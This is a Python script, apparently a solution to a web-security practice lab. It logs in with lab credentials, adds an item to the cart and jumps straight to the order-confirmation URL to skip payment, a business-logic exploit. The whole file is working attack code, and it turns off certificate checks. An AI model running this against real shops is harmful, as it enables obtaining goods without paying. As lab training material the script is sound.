import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def buy_item(s, url):
    #Retrieve csrf
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as user
    print("[+] Logging in as the user...")
    data_login = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("[+] Successfully logged in as user!")

        #Add item to cart
        cart_url = url + "/cart"
        data_cart = {'productId': '1', 'quantity': '1', 'redir': 'PRODUCT'}
        r = s.post(cart_url, data=data_cart, verify=False, proxies=proxies)

        #Confirm order / purchase item
        confirmation_url = url + "/cart/order-confirmation?order-confirmed=true"
        r = s.get(confirmation_url, verify=False, proxies=proxies)

        if 'Congratulations' in r.text:
            print("[+] Successfully exploited the business logic vulnerability!")
        else:
            print("[-] Could not exploit vulnerability")
            sys.exit(-1)

    else:
        print("[-] Could not log in as user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    buy_item(s, url)

if __name__ == "__main__":
    main()